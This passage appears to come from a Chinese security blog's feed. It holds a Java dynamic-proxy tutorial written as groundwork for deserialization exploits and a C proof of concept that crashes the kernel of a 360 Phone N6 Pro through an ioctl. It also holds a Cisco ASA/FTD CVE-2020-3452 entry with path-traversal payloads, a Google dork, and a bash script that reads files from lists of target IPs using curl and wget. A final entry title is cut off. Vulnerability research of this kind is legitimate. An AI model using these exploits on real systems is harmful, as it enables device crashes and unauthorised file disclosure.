<p><a href="http://blog.csdn.net/liujiahan629629/article/details/18013523">http://blog.csdn.net/liujiahan629629/article/details/18013523</a></p>
<p><a href="http://blog.csdn.net/zjf280441589/article/details/50453776">http://blog.csdn.net/zjf280441589/article/details/50453776</a></p>
<p><a href="http://ifeve.com/java-reflection/">http://ifeve.com/java-reflection/</a></p>
<p><a href="http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">Apache Commons Collections 3.x 版本的 Gadget调用链</a><a href="http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/</a>)</p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞学习实践三-理解java的动态代理机制</title>
    <url>/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%89-%E7%90%86%E8%A7%A3java%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h3 id="0x0、基础"><a href="#0x0、基础" class="headerlink" title="0x0、基础"></a><strong>0x0、基础</strong></h3><p>代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强，比如在某些函数执行前应该打印日志。如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），通过在方法中引用老程序的方法来实现自己的方法，从而实现在不改动源代码的基础上达到增强方法的目的。</p>
<p>代理模式：为其他对象提供一种代理以便控制对这个对象的访问（所谓控制，就是可以在其调用行为前后分别加入一些操作）。</p>
<p>代理模式分类：</p>
<ol>
<li>静态代理，其实质是类的继承或接口的实现，比较容易理解，注意结合场景。</li>
<li><strong>动态代理（Jdk动态代理），这是我们需要关注的重点，在反序列化漏洞的场景中需要用到！</strong></li>
<li>cglib动态代理</li>
</ol>
<h3 id="0x1、静态代理demo和理解"><a href="#0x1、静态代理demo和理解" class="headerlink" title="0x1、静态代理demo和理解"></a><strong>0x1、静态代理demo和理解</strong></h3><p>``</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;code&gt;&lt;strong&gt;package 反序列化3;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 代理模式的简单demo，静态代理</span><br><span class="line"> * </span><br><span class="line"> * 代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强（比如在某些函数执行前应该打印日志）。</span><br><span class="line"> * 如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），</span><br><span class="line"> * 通过在方法中引用老程序的方法来实现自己的方法，从而实现增强方法的目的。</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">public class proxyTest &#123;</span><br><span class="line">	  public static void main(String[] args) &#123;</span><br><span class="line">	        &#x2F;&#x2F;Subject sub &#x3D; new RealSubject();&#x2F;&#x2F;场景中得旧代码，老程序员写的。</span><br><span class="line">	        Subject sub &#x3D; new ProxySubject();&#x2F;&#x2F;新入职的程序员，自己实现了ProxySubject类，然后改成了这句。来增强老程序的代码。</span><br><span class="line">	        sub.request();</span><br><span class="line">	    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">abstract class Subject&#x2F;&#x2F;也可以是接口interface</span><br><span class="line">&#123;&#x2F;&#x2F;抽象角色：通过接口或抽象类声明真实角色实现的业务方法。</span><br><span class="line">    &#x2F;&#x2F;类比网络代理，比如http代理，都支持http协议</span><br><span class="line">    abstract void request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RealSubject extends Subject</span><br><span class="line">&#123;&#x2F;&#x2F;真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理角色调用。</span><br><span class="line">    &#x2F;&#x2F;类比真实的http请求</span><br><span class="line">       public RealSubject()&#x2F;&#x2F;默认构造方法</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void request()</span><br><span class="line">       &#123;</span><br><span class="line">              System.out.println(&quot;From real subject.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ProxySubject extends Subject&#x2F;&#x2F;关键是类的继承。</span><br><span class="line">&#123;&#x2F;&#x2F;代理角色：实现抽象角色，是真实角色的代理，通过真实角色的业务逻辑方法来实现抽象方法，并可以附加自己的操作。</span><br><span class="line">    &#x2F;&#x2F;类比通过代理发出http请求，这个代理当然可以对http请求做出任何想要的修改。</span><br><span class="line">    private RealSubject realSubject; &#x2F;&#x2F;以真实角色作为代理角色的属性</span><br><span class="line"></span><br><span class="line">       public ProxySubject()</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       @Override</span><br><span class="line">       public void request() &#x2F;&#x2F;该方法封装了真实对象的request方法，老程序员的方法。</span><br><span class="line">       &#123;&#x2F;&#x2F;所谓的“控制”就体现在这里</span><br><span class="line">        preRequest(); </span><br><span class="line">        if( realSubject &#x3D;&#x3D; null )</span><br><span class="line">        &#123;</span><br><span class="line">            realSubject &#x3D; new RealSubject();</span><br><span class="line">        &#125;</span><br><span class="line">        realSubject.request(); &#x2F;&#x2F;此处执行真实对象的request方法</span><br><span class="line">        postRequest();</span><br><span class="line">       &#125;</span><br><span class="line">       private void preRequest()</span><br><span class="line">       &#123;</span><br><span class="line">           &#x2F;&#x2F;在请求前做某些处理，比如打印日志，修改请求包等等</span><br><span class="line">           System.out.println(&quot;Do something before requesting: print log,change request&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       private void postRequest()</span><br><span class="line">       &#123;</span><br><span class="line">           &#x2F;&#x2F;在请求后做某些处理，打印日志</span><br><span class="line">           System.out.println(&quot;Do something after requesting: print log&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;﻿&lt;&#x2F;strong&gt;&lt;&#x2F;code&gt;</span><br><span class="line">**运行演示：**</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">**![img](https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId&#x3D;5f350ee4ab644158a9000a0d)**</span><br></pre></td></tr></table></figure>



<h3 id="0x2、动态代理demo及理解"><a href="#0x2、动态代理demo及理解" class="headerlink" title="0x2、动态代理demo及理解"></a><strong>0x2、动态代理demo及理解</strong></h3><p>但是静态代理这个模式本身有个大问题，如果类方法数量越来越多的时候，代理类的代码量是十分庞大的。比如为老程序员的所有代码都加上日志打印，难道老程序员实现过的所有类，新程序员都需要再实现一遍吗？</p>
<p>所以引入动态代理来解决此类问题。JDK内置的Proxy动态代理可以在运行时动态生成字节码，而没必要针对每个类编写代理类。他只需实现一个InvocationHandler就可以了。</p>
<p>在java的动态代理机制中，有两个重要的类或接口：一个是 InvocationHandler(Interface)；另一个则是 Proxy(Class)，这一个类和接口是实现我们动态代理所必须用到的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化3;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * 动态代理的简单demo，动态代理利用了反射机制</span><br><span class="line"> * 每一个动态代理类都会有一个与之关联的invocation handler。真正的调用是在invocation handler的invoke()方法里完成的。</span><br><span class="line"> * 感谢蝶离飞、廖新喜2位师傅的指导</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">public class proxyTest2&#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        DynamicSubject sub&#x3D;new RealDynamicSubject();&#x2F;&#x2F;之前这里sub的类型是RealDynamicSubject，不对；但是为什么呢？</span><br><span class="line">        Handler handler &#x3D; new Handler(sub);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</span><br><span class="line">        &#x2F;&#x2F;CLassLoader loader:指定动态代理类的类加载器,即生成完成后的代理对象的类加载器</span><br><span class="line">        &#x2F;&#x2F;Class&lt;?&gt; interfaces:指定动态代理类需要实现的所有接口，需要被增强的接口列表（数据）</span><br><span class="line">        &#x2F;&#x2F;InvocationHandler h: 指定与动态代理类关联的 InvocationHandler对象，具体的增强逻辑</span><br><span class="line"></span><br><span class="line">        DynamicSubject sub2 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), new Class[]&#123;DynamicSubject.class&#125;, handler); </span><br><span class="line"></span><br><span class="line">        DynamicSubject sub3 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), sub.getClass().getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        DynamicSubject sub4 &#x3D; (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), RealDynamicSubject.class.getInterfaces(), handler);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;从上面的调用方法可知，可以对不同的对象使用相同的模式实现来实现其代理，这就是相对静态代理的优势。</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;sub.getClass() &#x3D; &quot;+sub.getClass());</span><br><span class="line">        System.out.println(&quot;DynamicSubject.class &#x3D; &quot; +DynamicSubject.class);</span><br><span class="line">        System.out.println(new Class[]&#123;DynamicSubject.class&#125;);</span><br><span class="line">        System.out.println(RealDynamicSubject.class.getInterfaces());</span><br><span class="line"></span><br><span class="line">        sub2.request();</span><br><span class="line">        sub3.request();</span><br><span class="line">        sub4.request();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface DynamicSubject</span><br><span class="line">&#123;&#x2F;&#x2F;抽象角色：通过接口或抽象类声明真实角色实现的业务方法。注意:动态代理只能是接口，否则代理类转成该类型事会报错</span><br><span class="line">    &#x2F;&#x2F;类比网络代理，比如http代理，都支持http协议</span><br><span class="line">    abstract void request();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class RealDynamicSubject implements DynamicSubject</span><br><span class="line">&#123;&#x2F;&#x2F;真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理handler处理调用。</span><br><span class="line">    &#x2F;&#x2F;类比真实的http请求</span><br><span class="line">       public RealDynamicSubject()</span><br><span class="line">       &#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       public void request()</span><br><span class="line">       &#123;</span><br><span class="line">              System.out.println(&quot;From real subject.&quot;);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 处理器</span><br><span class="line"> *&#x2F;</span><br><span class="line">class Handler implements InvocationHandler&#123;</span><br><span class="line">    private Object obj; &#x2F;&#x2F;被代理的对象（也就是老程序员实现的对象），不管对象是什么类型；之前声明成RealDynamicSubject，不应该这么做</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 所有的流程控制都在invoke方法中</span><br><span class="line">     * proxy：代理类</span><br><span class="line">     * method：正在调用的方法，反射机制调用函数所必须！</span><br><span class="line">     * args：被调用方法的参数列表，反射机制调用函数所必须！</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;&#x2F;&#x2F;接口必须实现的方法，也是逻辑核心</span><br><span class="line">        System.out.println(&quot;Do something before requesting: print log&quot;);</span><br><span class="line">        Object xxx &#x3D; method.invoke(this.obj, args);&#x2F;&#x2F;通过反射机制调用老程序员的对象代码。</span><br><span class="line">        System.out.println(&quot;Do something after requesting: print log&quot;);</span><br><span class="line">        return xxx;</span><br><span class="line">    &#125;</span><br><span class="line">    public Handler(Object obj) &#123;</span><br><span class="line">        &#x2F;&#x2F;构造函数，把真实角色的实例传递进来,这个代理handler的目的就是增强它，或者说需要调用它来实现主要的功能。</span><br><span class="line">        this.obj &#x3D; obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>





<p>运行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014358963.png" alt="img"></p>
<h3 id="0x3、思考总结"><a href="#0x3、思考总结" class="headerlink" title="0x3、思考总结"></a>0x3、思考总结</h3><p>在后续将要学习的反序列化PoC构造过程中，我们需要用到这个动态代理机制，因为它提供一种【方法之间的跳转，从任意方法到invoke方法的跳转】，是我们将参数入口和代码执行联系起来的关键！</p>
<p>本文代码下载地址：</p>
<p><a href="https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3">https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3</a></p>
<p>参考</p>
<p><a href="http://www.runoob.com/design-pattern/design-pattern-intro.html">http://www.runoob.com/design-pattern/design-pattern-intro.html</a></p>
<p><a href="https://www.cnblogs.com/xiaoluo501395377/p/3383130.html">https://www.cnblogs.com/xiaoluo501395377/p/3383130.html</a></p>
<p><a href="https://www.cnblogs.com/xiaoxi/p/5961093.html">https://www.cnblogs.com/xiaoxi/p/5961093.html</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>360 Phone N6 Pro内核漏洞</title>
    <url>/2020/09/12/IOT/Exploit/360/360-Phone-N6-Pro%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令<strong>3235427072</strong>在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><ul>
<li>名称：360 Phone N6 Pro</li>
<li>型号：1801-A01</li>
<li>安卓版本：7.1.1</li>
<li>版本号：V096</li>
<li>内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64</li>
</ul>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p></p>
<hr>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* This is poc of 360 N6 Pro, 1801-A01</span></span><br><span class="line"><span class="comment">* Android Version: 7.1.1</span></span><br><span class="line"><span class="comment">* Version Number: V096</span></span><br><span class="line"><span class="comment">* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64</span></span><br><span class="line"><span class="comment">* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.</span></span><br><span class="line"><span class="comment">* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/block/mmcblk0rpmb&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3235427072</span>; <span class="comment">// 0xc0d8b300</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">fd = open(driver, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %dn&quot;</span>, driver, errno);</span><br><span class="line">system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try ioctl device file &#x27;%s&#x27;, with command 0x%x and payload NULLn&quot;</span>, driver, command);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(ioctl(fd, command, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %dn&quot;</span>, errno);</span><br><span class="line">system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>360</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2019-1663）Cisco 堆栈缓冲区溢出漏洞</title>
    <url>/2020/08/06/IOT/Exploit/Cisco/%EF%BC%88CVE-2019-1663%EF%BC%89Cisco%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2020-3452）Cisco ASAFTD 任意文件读取漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Cisco/%EF%BC%88CVE-2020-3452%EF%BC%89Cisco-ASAFTD-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Cisco Adaptive Security Appliance (ASA) 和 Cisco Firepower Threat Defense (FTD) 的 web 服务接口存在漏洞，允许未经身份验证的远程攻击者向受影响的设备发送一个精心制作的HTTP请求，成功利用该漏洞的攻击者能够进行目录遍历攻击并读取目标系统上的敏感文件。</p>
<p>该漏洞目前仅影响启用了AnyConnect或WebVPN配置的设备，并且此漏洞不能用于访问ASA或FTD系统文件或底层操作系统(OS)文件。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Cisco ASA：&lt;= 9.6<br>Cisco ASA：9.7 , 9.8 , 9.9 , 9.10 , 9.12 , 9.13 , 9.14<br>Cisco FTD：6.2.2 , 6.2.3 , 6.3.0 , 6.4.0 , 6.5.0 , 6.6.0</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>payload 1</strong></p>
<blockquote>
<p>/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../</p>
</blockquote>
<p><strong>payload 2</strong></p>
<blockquote>
<p>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua</p>
</blockquote>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200901164357304.png" alt="image-20200901164357304"></p>
<p>poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Cisco Adaptive Security Appliance Software 9.11 - Local File Inclusion</span></span><br><span class="line"><span class="comment"># Google Dork: inurl:/+CSCOE+/</span></span><br><span class="line"><span class="comment"># Date: 2020-08-27</span></span><br><span class="line"><span class="comment"># Exploit Author:  0xmmnbassel</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86</span></span><br><span class="line"><span class="comment"># Version: Cisco ASA Software  &gt;=9.14 except 9.11   Cisco FTD Software &gt;=6.2.2 and 6.2.3,6.3.0,6.4.0,6.50,6.60</span></span><br><span class="line"><span class="comment"># Vulnerability Type: unauthenticated file read</span></span><br><span class="line"><span class="comment"># CVE: CVE-2020-3452</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span>=<span class="string">&quot;%2bCSCOE%2b/portal_inc.lua&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">helpFunction()</span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t\tCVE-2020-3452&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span> -l targets.txt -r %2bCSCOE%2b/portal_inc.lua &quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t-l for list of IPs in text file&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t-r file to read, default: %2bCSCOE%2b/portal_inc.lua&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> -e <span class="string">&quot;\t-i for single IP test&quot;</span></span><br><span class="line">   <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;l:r:i:&quot;</span> opt</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$opt</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">      l ) input=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;</span><br><span class="line">      r ) <span class="built_in">read</span>=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;</span><br><span class="line">      i ) website=<span class="string">&quot;<span class="variable">$OPTARG</span>&quot;</span> ;;</span><br><span class="line">      ? ) helpFunction ;;</span><br><span class="line">   <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#if $website is empty or $input is empty</span></span><br><span class="line"><span class="keyword">if</span> [  -z <span class="string">&quot;<span class="variable">$website</span>&quot;</span>  ] &amp;&amp; [ -z <span class="string">&quot;<span class="variable">$input</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;Some/all of the parameters are empty&quot;</span>;</span><br><span class="line">   helpFunction</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#usage</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$website</span>&quot;</span>];</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">while</span> IFS= <span class="built_in">read</span> -r line</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    name=$(<span class="built_in">echo</span> <span class="variable">$line</span> | cut -c9-19)</span><br><span class="line">    <span class="comment">#echo &quot;testing $line&quot;</span></span><br><span class="line">    filename=<span class="string">&quot;<span class="variable">$name</span>.txt&quot;</span></span><br><span class="line">      <span class="comment">#echo $response</span></span><br><span class="line">      status=$(curl -LI  <span class="variable">$line</span><span class="string">&quot;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=&quot;</span><span class="variable">$read</span>  -o /dev/null   -w <span class="string">&#x27;%&#123;http_code&#125;\n&#x27;</span> -s)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> [ <span class="variable">$status</span> -eq <span class="string">&quot;400&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> doesn&#x27;t exist!&quot;</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        wget  <span class="string">&quot;<span class="variable">$line</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span>&quot;</span> -O <span class="variable">$name</span>.txt</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ -s <span class="variable">$filename</span> ]; <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> exists, reading <span class="variable">$read</span>...&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;downloaded!, <span class="variable">$line</span> is vulnerable to CVE-2020-3452.&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="string">&quot;not vulnerable!&quot;</span></span><br><span class="line">          rm -rf <span class="variable">$filename</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span> &lt; <span class="string">&quot;<span class="variable">$input</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">  name=$(<span class="built_in">echo</span> <span class="variable">$website</span> | cut -c9-16)</span><br><span class="line">  filename=<span class="string">&quot;<span class="variable">$name</span>.txt&quot;</span></span><br><span class="line"></span><br><span class="line">  status=$(curl -LI  <span class="variable">$website</span><span class="string">&quot;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=&quot;</span><span class="variable">$read</span>  -o /dev/null   -w <span class="string">&#x27;%&#123;http_code&#125;\n&#x27;</span> -s)</span><br><span class="line">  <span class="keyword">if</span> [ <span class="variable">$status</span> -eq <span class="string">&quot;Bad Request&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$website</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> doesn&#x27;t exist!&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$website</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span> exists, reading <span class="variable">$read</span>...&quot;</span></span><br><span class="line">    wget  <span class="string">&quot;<span class="variable">$website</span>/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=<span class="variable">$read</span>&quot;</span> -O <span class="variable">$name</span>.txt</span><br><span class="line">    <span class="keyword">if</span> [ -s <span class="variable">$filename</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;downloaded!, <span class="variable">$website</span> is vulnerable to CVE-2020-3452.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;not vulnerable!&quot;</span></span><br><span class="line">      rm -rf <span class="variable">$filename</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span>           </span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Cisco</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞</title>
    <url>/2020/09/12/IOT/Exploit/Huawei/%EF%BC%88CVE-2016-6158%EF%BC%89%E5%8D%8E%E4%B8%BAWS331a%E4%BA%A7%E5%93%81%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E/</url>
